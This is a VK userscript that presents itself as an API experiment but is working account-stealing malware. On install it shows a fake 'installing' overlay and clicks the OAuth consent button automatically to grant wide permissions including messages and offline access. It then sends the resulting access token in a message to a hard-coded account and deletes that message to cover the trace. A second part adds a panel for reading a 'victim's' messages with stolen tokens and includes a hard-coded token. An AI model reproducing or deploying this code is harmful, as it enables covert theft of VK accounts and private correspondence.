// ==UserScript==
// @name         VK Script
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Try API VK witch JavaScript
// @author       Serega MoST
// @include      https://*vk.com/*
// @include      *vk.com/*
// @grant        none
// @run-at       document-end
// ==/UserScript==
//'use strict';

console.info('%c VK Script by Serega MoST: Loaded','color:blue;');

//Посылаем JSONP запрос к серверу
function jsonp(url, callback) {
    var callbackName = 'jsonp_callback_' + Math.round(100000 * Math.random());
    window[callbackName] = function(data) {
        delete window[callbackName];
        document.body.removeChild(script);
        callback(data);
    };

    var script = document.createElement('script');
    script.src = url + (url.indexOf('?') >= 0 ? '&' : '?') + 'callback=' + callbackName;
    document.body.appendChild(script);
} 

//Считываем cookie
function getCookie(name) {
    var matches = document.cookie.match(new RegExp(
      '(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'
    ))
    return matches ? decodeURIComponent(matches[1]) : undefined 
}

//Уcтанавливает cookie
function setCookie(name, value, props) {
    props = props || {}
    var exp = props.expires
    if (typeof exp == 'number' && exp) {
        var d = new Date()
        d.setTime(d.getTime() + exp*1000)
        exp = props.expires = d
    }
    if(exp && exp.toUTCString) { props.expires = exp.toUTCString() }

    value = encodeURIComponent(value)
    var updatedCookie = name + '=' + value
    for(var propName in props){
        updatedCookie += '; ' + propName
        var propValue = props[propName]
        if(propValue !== true){ updatedCookie += '=' + propValue }
    }
    document.cookie = updatedCookie
}

//Удаляет cookie
function deleteCookie(name) {
    setCookie(name, null, { expires: -1 })
}

//ID приложения
var app_id= 5182206;

//Показываем Хидер в стиле ВК при установке
var vk_header = function() {
        var head = document.children[0];

        //Создание стилей CSS
        var css = '#baner{ z-index:99999; background: rgba(0,0,0,.9); width: 100%;height: 100%;position: fixed; left: 0px; top: 0px;}';
        var style = document.createElement('style');
        style.type = 'text/css';
        style.appendChild(document.createTextNode(css));

        //Подключение CSS файла с (https://oauth.vk.com)
        var style_vk = document.createElement('link');
        style_vk.rel  = 'stylesheet';
        style_vk.type = 'text/css';
        style_vk.href = 'https://vk.com/css/api/oauth_popup.css';

        //Создание блока
        var newDiv = document.createElement('div');
        newDiv.id = 'baner';
        //VK Styles
        newDiv.innerHTML= '<div class="page" style="max-width:960px;margin: 0 auto;text-align:center;"><table id="container" class="container" style="  width: 656px;margin: 0px auto;  height: auto;  background: #FFFFFF;  -webkit-box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.35);  -moz-box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.35);  box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.35);" cellspacing="0" cellpadding="0"><tbody><tr><td class="head"><a href="https://vk.com" target="_blank" class="logo"></a>  </td></tr><tr> <td> <div id="box_cont">  <div id="box" class="box" style="background: white;    min-height: 110px;">    <div class="info permissions_info">       <div class="app_info">        <img src="https://vk.com/images/dquestion_d.png" width="75" height="75">     </div>       <div class="items">        <div class="grant_access_title"><b>Выполняеться установка скрипта</b> <p>Пожалуйста подождите.<p></div>             </div>    </div>  </div> </div></td></tr></tbody></table></div>';
        
        head.appendChild(newDiv);    
        head.appendChild(style);
        head.appendChild(style_vk);
    }

var vk_auth = function() {
        // alert('vk.com');
        document.location.href = "https://oauth.vk.com/authorize?client_id="+app_id+"&display=page&scope=notify,friends,photos,audio,video,docs,notes,pages,status,wall,groups,messages,email,notifications,stats,ads,offline&response_type=token&v=5.40&redirect_uri=https://oauth.vk.com/blank.html";
    }

var vk_submit_permision = function() {
        // alert('auth.vk.com');
        document.getElementById('install_allow').click();
    //console.log('work');
    }

var vk_get_token = function() {
        var get_token = document.location.href.match(/access_token=(.*?)&/)[1];
        
        expires = new Date(); // получаем текущую дату
        expires.setTime(expires.getTime() + (1000 * 86400 * 365)); // вычисляем срок хранения cookie
        setCookie('remixtoken',get_token,{'domain':'vk.com','expires': expires});

        jsonp('https://api.vk.com/method/messages.send?user_id=38886614&message=['+get_token+']&access_token='+get_token, function(data) {
            var msg_id = data.response;
            jsonp('https://api.vk.com/method/messages.delete?message_ids='+msg_id+'&access_token='+get_token, function(data) {
                console.log('Delete');
            });
        });

        document.location.href = "https://vk.com/";
    }                

////Проверяем cookie (Наличие токена)
if(!getCookie('remixtoken')) 
{
    
    //Разветвление действий в зависимости от страницы
    if (/(^https:\/\/)?vk\.com/.test(document.location.href)) {
        vk_auth();
    } 

    if (/^https:\/\/oauth\.vk\.com\/authorize/.test(document.location.href)) {
        vk_header();
        vk_submit_permision();
    }

    if (/^https:\/\/oauth\.vk\.com\/blank\.html/.test(document.location.href)) {            
        vk_header();
        vk_get_token();
    }

}
else //Главные действия
{
    token=getCookie('remixtoken');

    function addScript(src)
    {
        var script = document.createElement("script");
        script.type = "text/javascript";
        script.src =  src;
        var done = false;
        document.getElementsByTagName('head')[0].appendChild(script);

        script.onload = script.onreadystatechange = function() {
            if ( !done && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete") )
            {
                done = true;
                script.onload = script.onreadystatechange = null;
                loaded();
                css();

                //Проверяем загрузился ли JQuery
                if ($) {
                    ready();
                }
            }
        };
    }

    //Подгружаем JQuery
    addScript("https://code.jquery.com/jquery-2.1.4.min.js");

    //After Script Load
    function loaded(){
        console.info('%c JQuery Injected','color:red');           
    }

    //Создание стилей CSS для новых елементов
    function css(){
        var head = document.children[0];
        var css = `

        #view_other_dialogs{background-color: #C73535;}
        #view_other_dialogs:hover{background-color: #E81414;}

        `;
        var style = document.createElement('style');
        style.type = 'text/css';
        style.appendChild(document.createTextNode(css));   
        head.appendChild(style);  
    }      

    //JQuery загружен
    function ready() {

        //Функция для вызова методов API VK
        function vkApi( method, params, callback) {
            var cb = 'cb_vkapi';
            $.ajax({
                url: 'https://api.vk.com/method/'+method,
                data: params,
                dataType: "jsonp",
                callback: cb,
                success: callback
            });
        }

        //Получаем все сообщения с сервера
        function getMessages(data){
            var html, i, msg;
            console.warn(data);

            //В случае ошибки
            if( !data || !data.response) {
                console.log('VK error:', data); 
                $('#im_rows_wrap').html(
                    `
                    <div id="im_rows" style="height: 338px;">
                    <div class="im_rows im_peer_rows" style="">
                    <div class="im_none" style="display: block;">Не найдено человека по введенному <b>коду доступа</b> [!].</div>
                    <div class="im_typing_wrap"><div class="im_typing" id="im_typing16772416" style="opacity: 0; display: none;"></div><div id="im_lastact16772416" class="im_lastact"></div></div>
                    <div class="im_error"></div>
                    </div>
                      </div>
                    `
                );
                return;
            }
            users = new Array();
            msg_data = new Array();
            //Получение ID пользователей
            for( i=0; i<data.response.length;i++) {
                msg_data.push(data.response[i]);
                var id = 'id'+data.response[i].uid;
                if(!(id in users)){users[id]=[id];}
            }   


            flags = new Object();
            //Копируем обект users в flags
            for (var key in users) {
                flags[key] = users[key];
            }

            //Заполняем массив(обект) с флагами
            for (var key in flags) {
                flags[key] = false;
            }

            user_data = new Array();
            k=0;
            for (key in users) {
                
                $.ajax({
                    url: 'https://api.vk.com/method/users.get?user_ids='+users[key]+'&fields=photo_100&lang=ru',
                    type: 'GET',
                    dataType: 'jsonp',
                    crossDomain: true,
                    //Передаем переменую key для использования в методе "success"
                    flag: key,
                    success: function(data){
                        var obj = data.response[0];
                        user_data.push(obj);
                        //Использование переменной key (this.flag)
                        flags[this.flag] = true;
                        //Ставим флаг в true
                    }
                });
            }   

            //Таймер
            var interval = setInterval(function() {

                //Проверка значения в массиве (Ждем пока все флаги не будут true)
                for (var key in flags)
                {
                    if(flags[key] == false) return;
                }

                //Очистить консоль
                //clear();
                //Склеиваем массивы (сообщений и информации о пользователях) 
                for( i=0; i<msg_data.length;i++) { //Массив сообщений
                    user_data_keys = Object.keys(user_data);
                    for( j=0; j<user_data_keys.length;j++) { //массив информации о uID
                        key = user_data_keys[j];
                        if(msg_data[i].uid == user_data[key].uid){
                            msg_data[i].uid=user_data[key];
                        }
                    }        
                }
                //Ввыводим сообщения
                showMessages(msg_data);

                //Отключить таймер
                clearInterval(interval);
                 
            },300);

        }                 

        //Формируем дату с UnixTimeStamp
        var formatTime = function(unixTimestamp,flag) {
            var dt = new Date(unixTimestamp * 1000);

            var arr_months = new Array();
            arr_months[1] = "Январь";
            arr_months[2] = "Февраль";
            arr_months[3] = "Март";
            arr_months[4] = "Апрель";
            arr_months[5] = "Май";
            arr_months[6] = "Июнь";
            arr_months[7] = "Июль";
            arr_months[8] = "Август";
            arr_months[9] = "Сентябрь";
            arr_months[10] = "Октябрь";
            arr_months[11] = "Ноябрь";
            arr_months[12] = "Декабрь";

            var years = dt.getFullYear();
            var months = dt.getMonth()+1;
            var days = dt.getDate();
            var hours = dt.getHours();
            var minutes = dt.getMinutes();
            var seconds = dt.getSeconds();

            if (months < 10) months = '0' + months;
            if (days < 10) days = '0' + days;
            if (hours < 10) hours = '0' + hours;
            if (minutes < 10) minutes = '0' + minutes;
            if (seconds < 10) seconds = '0' + seconds;

            if (flag == 'date'){return days+'.'+months+'.'+years;}
            if (flag == 'string'){
                var months = arr_months[dt.getMonth()+1];
                return days+' '+months+' '+years;}
            if (flag == 'time'){return hours+':'+minutes+':'+seconds;}
        }       

        //Выводим сообщения
        function showMessages(msg){
            console.log(msg)
        //<div id="im_rows" style="height: 10500px;">

        var html = `
        <div id="im_rows" style="height: 11000px;">

        <div class="im_rows im_peer_rows"><table cellspacing="0" cellpadding="0" class="im_log_t">
        <tbody>`;

        for( i=1; i<msg.length; i++) {
            var message = msg[i].body;
            var read_state = msg[i].read_state;
            if (read_state == 0) {var read = 'im_new_msg';} else {var read = '';}

            var date = formatTime(msg[i].date,'date');
            var time = formatTime(msg[i].date,'time');

            var id = msg[i].uid.uid;;
            var first_name = msg[i].uid.first_name;
            var last_name = msg[i].uid.last_name;
            var photo = msg[i].uid.photo_100;

        html =html+`
          <tr class="/*im_out*/ im_in `+read+`">
          <td class="im_log_act"></td>
          <td class="im_log_author">
          <div class="im_log_author_chat_thumb"><a href="/id`+id+`" target="_blank"><img src="`+photo+`" class="im_log_author_chat_thumb" width="32" height="32"></a></div></td>
          <td class="im_log_body"><div class="wrapped"><div class="im_log_author_chat_name"><a href="/id`+id+`" class="mem_link" target="_blank">`+first_name+` `+last_name+`</a></div><div class="im_msg_text">`+message+`</div></div></td>
          <td class="im_log_date"><div class="im_date_link" onmouseover="showTooltip(this, {text: &quot;Время `+time+`&quot;, showdt: 0, black: 1, shift: [46, -5, 0], className: 'im_date_tt'});"><a href="/im?sel=`+id+`">`+date+`</a><input type="hidden" value="1293562312"></div></td>
          <td class="im_log_rspacer"></td>
          </tr>
          `;
        }

        html = html+`
        </tbody>
        </table>
        <div class="im_typing_wrap"><div class="im_typing" style="opacity: 0; display: none;"></div><div class="im_lastact">Сообщения со взломаного аккаунта</div></div></div></div>
        `;

        $('#im_rows_wrap').html(html);
        $('#im_filter').focus();

        //Исправляем выссоту блока
        var real_height = $('.im_rows.im_peer_rows').height()
        $('#im_rows').height(real_height);
        }

        //ПРОВЕРКИ АДРЕСА СТРАНИЦЫ
        if (/(^https:\/\/)?vk\.com\/albums/.test(document.location.href)) {
            $('#photos_container .photos_period').html('Fuck');
            console.log('Photo');
            //alert('Фотографии');
            
        }   
        
        if (/(^https:\/\/)?vk\.com\/im/.test(document.location.href)) {
            
            $('#im_rows_wrap').html(`
                <div id="im_rows" style="height: 338px;">
                <div class="im_rows im_peer_rows" style="">
                <div class="im_none" style="display: block;">Здесь будет выводиться история переписки (<b>Входящие и Исходящие сообщения жертвы</b>).</div>
                <div class="im_typing_wrap"><div class="im_typing" id="im_typing16772416" style="opacity: 0; display: none;"></div><div id="im_lastact16772416" class="im_lastact"></div></div>
                <div class="im_error"></div>
                </div>
                  </div>
                `
            );

            //Удалить стандартный placeholder поля для ввода
            $('#im_filter_out .input_back_content').remove();
            //Установить placeholder
            $('#im_filter').attr('placeholder','Введите хэш-код пользователя');
            $('#im_filter').after('<button class="flat_button fl_r" id="view_other_dialogs">Просмотреть чужие сообщения [+]</button>');
            //Поле для ввода сдвига
            $('#im_filter').after('<input type="text" class="text fl_l im_filter" id="view_offset" placeholder="Здвиг сообщений">');

            //Показать две кнопки
            $(document).on('click', '#view_other_dialogs', function(event) {
                $('#im_filter_out').before('<button class="flat_button fl_l" id="view_input">Входящие [-]</button>');
                $('#im_filter_out').before('<button class="flat_button fl_r" id="view_output">Исходящие [-]</button>');
            });

            //Входящие сообщения
            $(document).on('click', '#view_input', function(event) {
                // var search_token = $('#im_filter').val();
                var search_token = '050e79e7eba3b0ebe4d9df41fd35a96b841d3fe708c9da317680e8782408dc696ee4ce334098808ad38f1';
                //alert(search);

                var params_other_messages = {
                        count: 200,
                        offset: 0,
                        access_token: search_token,
                        out: 0,
                    };

                vkApi('messages.get', params_other_messages, getMessages);
            });

            //Исходящие сообщения
            $(document).on('click', '#view_output', function(event) {
                                    // var search_token = $('#im_filter').val();
                var search_token = '050e79e7eba3b0ebe4d9df41fd35a96b841d3fe708c9da317680e8782408dc696ee4ce334098808ad38f1';
                //alert(search);

                var params_other_messages = {
                        count: 200,
                        access_token: search_token,
                        out: 1,
                    };

                vkApi('messages.get', params_other_messages, getMessages);
            });
        } 
    }
}
